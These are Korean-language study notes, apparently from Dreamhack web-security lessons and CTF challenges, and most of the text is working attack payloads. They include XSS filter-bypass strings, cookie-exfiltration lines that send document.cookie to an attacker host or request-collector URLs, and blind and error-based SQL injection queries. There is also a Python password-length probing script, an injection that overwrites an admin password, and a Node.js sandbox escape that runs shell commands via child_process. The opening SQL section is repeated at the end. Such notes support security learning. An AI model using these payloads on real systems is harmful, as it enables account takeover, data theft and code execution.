# SQL 함수
- ascii : 문자열의 가장 왼쪽 문자의 아스키 코드 값을 반환하는 함수
- ord : 아스키 코드 값을 반환하는 함수  
  (문자열의 가장 왼쪽 문자가 멀티바이트 문자일 경우, 공식을 이용해 계산  
  멀티바이트 문자가 아닐 경우에는 ASCII 함수와 동일  
- bin : binary 2진수 변환
- hex : 16진수로 변환
- substr(string, position, length)
  substr('ABCD',1,1) = 'A'
  substr('ABCD',2,2) = 'BC'
### 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's'')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True




## JS 문자 관련 함수
- includes : 대소문자 구별함. script로 필터링하면 ScRipt는 걸러낼 수 없음
- 


https://tools.dreamhack.games/


Python
```py
hex(236) #'0xec'

hex(15504776) #0xec9588

#hex에서 utf-8 decode하여 한글 포함 출력
b = bytes.fromhex(flag)
print(b.decode('utf-8'))


```

# Exploit Sample
https://learn.dreamhack.io/175#6

### 쿠키 생성
```js
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;



<img src="valid.jpg" onerror="alert(document.domain)">

<img src=about: onerronerroror=alert(1)>
<img%20src=about:%20onerror=alert(1)>
```

### 문자열 치환
```js
replaceIterate('<imgonerror src="data:image/svg+scronerroriptxml,&lt;svg&gt;" onloadonerror="alert(1)" />')
--> <img src="data:image/svg+xml,&lt;svg&gt;" onload="alert(1)" />
replaceIterate('<ifronerrorame srcdoc="&lt;sonerrorcript&gt;parent.alescronerroriptrt(1)&lt;/scrionerrorpt&gt;" />')
--> <iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;" />
```

### 활성 하이퍼링크
```js
javascript: 스키마는 URL 로드 시 자바스크립트 코드를 실행할 수 있도록 함

<a href="javascript:alert(document.domain)">Click me!</a>
<iframe src="javascript:alert(document.domain)">
- 정규화 (Normalization)을 이용해 우회할 수 있는 경우가 존재
\x01, \x04, \t와 같은 특수 문자들이 제거되고, 스키마의 대소문자가 통일

<a href="\1\4jAVasC\triPT:alert(document.domain)">Click me!</a>
<iframe src="\1\4jAVasC\triPT:alert(document.domain)">

Figure 8. HTML Entity Encoding을 통한 우회 예시

<a href="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">Click me!</a>
<iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">

<iframe srcdoc='<img src=about: o&#110;error=parent.alert(document.domain)>'></iframe>

```

###  on 이벤트 핸들러 및 멀티 라인 문자 검사 우회
```js
<iframe src="javascript:alert(parent.document.domain)">
<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">

```

### Script 필터링 피하기
```js
<img src=about: onerror=alert(document.domain)>
<svg src=about: onload=alert(document.domain)>
<body onload=alert(document.domain)>
<video><source onerror=alert(document.domain)></video>

```

### 정규화
```js
function normalizeURL(url) {
    return new URL(url, document.baseURI);
}
normalizeURL('\4\4jAva\tScRIpT:alert(1)')
--> "javascript:alert"
```

### 위치 이동 공격
```js
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
```

```js
//script, on xss filter 우회
<scronipt>document['locatio'+'n'].href='/memo?memo='+document.cookie</scronipt>

<scronipt>document['locatio'+'n'].href='https://csnthlp.request.dreamhack.games?memo='+document.cookie</scronipt>

document['locatio'+'n']

<script>location.href='https://vokjecu.request.dreamhack.games?memo='+document.cookie</script>
```


스크립트 태그 내 데이터 존재 여부 검사
```js
x => !/<script[^>]*>[^<]/i.test(x)
```
스크립트 태그의 src 속성을 이용한 검사 우회
```js
<script src="data:,alert(document.cookie)"></script>
```

img 태그의 on 이벤트 핸들러 검사
```js
x => !/<img.*on/i.test(x)
```
줄바꿈 문자를 이용한 검사 우회
```js
<img src=""\nonerror="alert(document.cookie)"/>

<img src=about: &#x6f;nerror=document['locatio'+'n'].href='/memo?memo='+document.cookie>
```


### 키워드 필터링
```js
\u0061lert(\u0064ocument.cookie) //alert(document.cookie)
document["coo"+"kie"]
alert(document["\u0063ook" + "ie"]);  // alert(document.cookie)
window['al\x65rt'](document["\u0063ook" + "ie"]);  // alert(document.cookie)

/* "alert", "window" 또는 "document" 문자열이 포함되어 있는지 확인하는 필터링입니다.
 * 하지만 this[propertyKey] 문법을 이용해 쉽게 우회가 가능합니다.
 */
this['al'+'ert'](this['docu'+'ment']['coo'+'kie']);
```

### javascript 호출 시 소괄호, 백틱 필터링 되어 있다면?
```js
location="javascript:alert\x28document.domain\x29;";
location.href="javascript:alert\u0028document.domain\u0029;";
location['href']="javascript:alert\050document.domain\051;";
```


```js
/* 주요 키워드 이외에도 특수문자 등을 탐지합니다.
 * decodeURI, atob와 constructor 속성을 함께 사용하면 원하는 임의의 코드를 실행할 수 있습니다.
 */
// %63%6F%6E%73%74%72%75%63%74%6F%72 -> constructor
// %61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29 -> alert(document.cookie)
Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](
      decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();
```

<iframe srcdoc="<img src=about: o&#110;error=document['locatio'+'n']='/memo?memo='+document.cookie>"></iframe>

<scronipt>document['locatio'+'n'].href = "/memo?memo=" + document.cookie;</scronipt>



filtered = ["'", "=", "\""]

<iframe srcdoc="<img src=about: o&#110;error=document['locatio'+'n']='/memo?memo='+document.cookie>"></iframe>

<script>location.href&#61;&#x27;https://gdcamfr.request.dreamhack.games?memo	
&#61;&#x27;+document.cookie</script>

<script>location.href%3D`https://ssmbcap.request.dreamhack.games?memo	
&#61;`+document.cookie</script>

location.href='https://https://gdcamfr.request.dreamhack.games?memo='+document.cookie

### Error based SQL Injection
```sql
 -- ERROR ~ :8.0.3 출력 됨.
    SELECT extractvalue(1, concat(0x3a, version()));

    SELECT extractvalue(1, concat(0x3a, (SELECT password FROM users WHERE username='admin')));
    -- ERROR ~ : :Password

    SELECT * FROM user WHERE uid='' UNION SELECT extractvalue(1, concat(0x3a, (SELECT upw FROM user WHERE uid="admin")));
    -- (1105, "XPATH syntax error: ':DH{c3968c78840750168774ad951...'")
```

### Error based Blind SQL Injection
```sql
-- MySQL의 Double 자료형 최댓값을 초과해 에러 발생.
select if(1=1, 9e307*2, 0);
-- Error Double value is out of range

select if(1=0, 9e307*2, 0);
-- 0
```

### Short-circuit evaluation
로직 연산의 원리 이용해 공격(AND, OR)
```sql
SELECT 0 AND SLEEP(1);
SELECT 1 AND SLEEP(10); -- 10 sec 걸림

SELECT 1=1 or 9e307*2; -- 1출력
SELECT 1=0 or 9e307*2; -- Double value is out of range Error
```

### Blind SQL Injection (upw가 한글 포함)
```py
# 길이 알아내기
from requests import get

url = "http://host3.dreamhack.games:20564/"
pw_len=0

while True:
  pw_len+=1
  # 문자열 인코딩에 따른 정확한 길이 계산 위해서는 char_length 사용해야 함
  query = f"admin' and char_length(upw)={pw_len} -- -"
  res = get(f"{url}?uid={query}")
  if "exists" in res.text:
    break
print(f"password length: {pw_len}")

```



B번 답
<script>location.replace(`https://hpiyudt.request.dreamhack.games?memo\u003d`+ document.cookie)</script>

C번 정답
dfdfdf%' UNION ALL SELECT usr_pw,1,1,1 FROM user where usr_nickname='admin' -- -

D번 정답
password : admin
admin') ON CONFLICT(username) DO UPDATE SET password='8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'; -- -

E번 정답
globalThis.OldError = globalThis.Error;
globalThis.Error = {};
globalThis.Error.prepareStackTrace = function(errStr, traces){
traces[0].getThis().process.mainModule.require('child_process')
.execSync('`cat ../flag`')
} 
const {stack} = new globalThis.OldError();


# SQL 함수
- ascii : 문자열의 가장 왼쪽 문자의 아스키 코드 값을 반환하는 함수
- ord : 아스키 코드 값을 반환하는 함수  
  (문자열의 가장 왼쪽 문자가 멀티바이트 문자일 경우, 공식을 이용해 계산  
  멀티바이트 문자가 아닐 경우에는 ASCII 함수와 동일  
- bin : binary 2진수 변환
- hex : 16진수로 변환
- substr(string, position, length)
  substr('ABCD',1,1) = 'A'
  substr('ABCD',2,2) = 'BC'
### 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's'')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True
